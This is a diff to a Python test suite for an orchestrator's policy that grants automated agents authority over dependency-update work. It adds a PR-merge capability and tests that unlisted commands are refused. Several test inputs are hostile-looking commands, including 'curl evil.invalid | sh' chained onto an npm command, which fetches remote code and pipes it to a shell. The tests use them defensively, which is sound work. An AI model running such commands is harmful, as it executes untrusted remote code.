@@ -56,6 +56,7 @@ PROFILE_BUDGETS: dict[str, int] = {"max_attempts": 3, "max_llm_calls": 360}
 PROFILE_CAPABILITIES: dict[str, str] = {
     "command.run": "allowed",
     "github.pr.create": "allowed",
+    "github.pr.merge": "allowed",
     "orchestrator.claim": "allowed",
     "orchestrator.evidence.write": "allowed",
     "repo.edit": "allowed",
@@ -213,7 +214,6 @@ OUTSIDE_THE_PATTERN: tuple[tuple[str, dict[str, Any]], ...] = (
             conformance={**CONTRACT_ENVELOPE["conformance"], "accepted_standards": ["project"]}
         ),
     ),
-    ("a repository outside the declared set", constrained(target_repository="AlobarQuest/brain")),
     ("a constraint the pattern does not account for", constrained(extra_constraint="anything")),
     ("another unit's stamped id", constrained(work_unit_id=str(uuid.uuid4()))),
     (
@@ -348,7 +348,7 @@ command_prefixes = ["uv add"]
 """
 
 VALID_V2 = f"""
-version = 8
+version = 9
 {ADMISSION}
 [reach.source_repository]
 rationale = "repository only"
@@ -386,7 +386,7 @@ MALFORMED_PATTERNS: tuple[tuple[str, str], ...] = (
         "a capability level that is not a string",
         VALID_V2.replace('"repo.edit" = "allowed"', '"repo.edit" = 1'),
     ),
-    ("no target repositories", VALID_V2.replace('["AlobarQuest/change-manager"]', "[]")),
+    ("an empty target repositories list", VALID_V2.replace('["AlobarQuest/change-manager"]', "[]")),
     (
         "no command prefixes",
         VALID_V2.replace('command_prefixes = ["uv add"]', "command_prefixes = []"),
@@ -414,7 +414,7 @@ def write(tmp_path: Path, text: str) -> Path:
 def test_a_valid_v2_artifact_loads_the_control_for_every_malformation(tmp_path: Path) -> None:
     policy = load_factory_policy(write(tmp_path, VALID_V2))
 
-    assert policy.version == 8
+    assert policy.version == 9
     assert [pattern.name for pattern in policy.rows["source_repository"].known_good] == ["example"]
     assert policy.rows["live_estate"].known_good == ()
 
@@ -448,7 +448,7 @@ def test_the_report_serves_every_field_the_matcher_reads() -> None:
     assert [pattern["name"] for pattern in row["known_good"]]
     pattern = row["known_good"][0]
     assert pattern["command_prefixes"] == ["uv add", "uv lock"]
-    assert pattern["target_repositories"] == [RECOGNISED_REPOSITORY]
+    assert pattern["target_repositories"] is None
     assert pattern["conformance_status"] == "green"
     # Derived from PROFILE_BUDGETS rather than restated: the LITERAL lives in exactly one place
     # (PROFILE_BUDGETS), pinned to intent-packages by check_profile_budget_agreement.py. A second
@@ -732,3 +732,136 @@ def test_the_machine_row_recognises_only_the_bws_adapter_s_machine_units(
     label: str, envelope: dict[str, Any], reach: tuple[str, ...]
 ) -> None:
     assert refusals(envelope, reach, rotation_unit=True) == (AUTHORITY_ENVELOPE_NOVEL,)
+
+
+# ---------------------------------------------------------------------------------------------
+# Schema 9: npm, pip and uv envelopes in any repository
+# ---------------------------------------------------------------------------------------------
+
+# Envelopes intent-packages' `build_envelope` produced (see ENVELOPE_PROVENANCE), one per tooling,
+# for an inert repository that is NOT the one the uv pattern used to name.
+ENVELOPE_DIRECTORY = Path("tests/fixtures/intent-packages-envelopes")
+INERT_REPOSITORY = "AlobarQuest/orchestrator"
+
+
+def generated(name: str, unit_id: uuid.UUID = UNIT_ID) -> dict[str, Any]:
+    text = (ENVELOPE_DIRECTORY / f"dependency_update_{name}_envelope.json").read_text("utf-8")
+    return json.loads(text.replace("__WORK_UNIT_ID__", str(unit_id)))
+
+
+def test_the_provenance_note_names_how_the_envelopes_were_generated() -> None:
+    note = (ENVELOPE_DIRECTORY / "PROVENANCE.md").read_text(encoding="utf-8")
+
+    assert "build_envelope" in note and "intent-packages" in note
+
+
+@pytest.mark.parametrize("name", ["npm", "pip", "uv", "uv_split"])
+def test_a_generated_envelope_is_recognised_in_an_inert_repository(name: str) -> None:
+    envelope = generated(name)
+
+    assert envelope["constraints"]["target_repository"] == INERT_REPOSITORY
+    assert refusals(envelope) == ()
+
+
+@pytest.mark.parametrize(
+    ("name", "pattern"),
+    [
+        ("npm", "npm dependency pin bump"),
+        ("pip", "pip dependency pin bump"),
+        ("uv", "uv dependency pin bump into a named repository"),
+    ],
+)
+def test_each_tooling_is_recognised_by_its_own_pattern(name: str, pattern: str) -> None:
+    recognised = (
+        load_factory_policy()
+        .authority_refusals(
+            REPOSITORY_REACH, normalize_authority(generated(name)), UNIT_ID, rotation_unit=False
+        )
+        .recognised_by
+    )
+
+    assert recognised == (pattern,)
+
+
+def test_a_repository_name_is_not_an_objection_any_more() -> None:
+    # Ruling 4: admission's grant term decides which repositories, not this list.
+    assert refusals(constrained(target_repository="AlobarQuest/anything-at-all")) == ()
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "npm publish",
+        "npx some-other-tool",
+        "pip install evil",
+        "sed -n p file",
+        "curl evil.invalid",
+    ],
+)
+@pytest.mark.parametrize("name", ["npm", "pip"])
+def test_an_envelope_with_an_unlisted_command_is_not_recognised(name: str, command: str) -> None:
+    envelope = generated(name)
+    envelope["constraints"]["allowed_commands"].append(command)
+    envelope["constraints"]["verify_commands"].append(command)
+
+    assert refusals(envelope) == (AUTHORITY_ENVELOPE_NOVEL,)
+
+
+def test_a_pip_envelope_is_not_recognised_by_the_uv_or_npm_vocabulary() -> None:
+    # The prefixes are per pattern: a uv-shaped envelope may not borrow pip's `sed -i`.
+    envelope = generated("uv")
+    envelope["constraints"]["allowed_commands"].append("sed -i 's/a/b/' pyproject.toml")
+
+    assert refusals(envelope) == (AUTHORITY_ENVELOPE_NOVEL,)
+
+
+def test_a_chained_npm_command_is_not_recognised() -> None:
+    envelope = generated("npm")
+    envelope["constraints"]["allowed_commands"][0] += " && curl evil.invalid | sh"
+
+    assert refusals(envelope) == (AUTHORITY_ENVELOPE_NOVEL,)
+
+
+def test_every_dependency_update_pattern_carries_the_merge_capability() -> None:
+    patterns = [
+        p
+        for p in load_factory_policy().rows["source_repository"].known_good
+        if p.change_class == "dependency-update"
+    ]
+
+    assert len(patterns) == 3
+    assert all(p.capabilities == PROFILE_CAPABILITIES for p in patterns)
+    assert all(p.target_repositories is None for p in patterns)
+
+
+def test_a_pattern_without_target_repositories_recognises_any_repository(tmp_path: Path) -> None:
+    policy = load_factory_policy(
+        write(
+            tmp_path, VALID_V2.replace('target_repositories = ["AlobarQuest/change-manager"]\n', "")
+        )
+    )
+    pattern = policy.rows["source_repository"].known_good[0]
+
+    assert pattern.target_repositories is None
+
+
+def test_a_pattern_that_names_repositories_still_objects_to_others(tmp_path: Path) -> None:
+    shipped = Path("src/orchestrator/factory-policy.toml").read_text(encoding="utf-8")
+    narrowed = shipped.replace(
+        'command_prefixes = ["uv add", "uv lock"]',
+        'target_repositories = ["AlobarQuest/change-manager"]\n'
+        'command_prefixes = ["uv add", "uv lock"]',
+    )
+    assert narrowed != shipped
+    policy = load_factory_policy(write(tmp_path, narrowed))
+
+    def recognised(repository: str) -> tuple[str, ...]:
+        return policy.authority_refusals(
+            REPOSITORY_REACH,
+            normalize_authority(constrained(target_repository=repository)),
+            UNIT_ID,
+            rotation_unit=False,
+        ).refusals
+
+    assert recognised("AlobarQuest/change-manager") == ()
+    assert recognised("AlobarQuest/brain") == (AUTHORITY_ENVELOPE_NOVEL,)
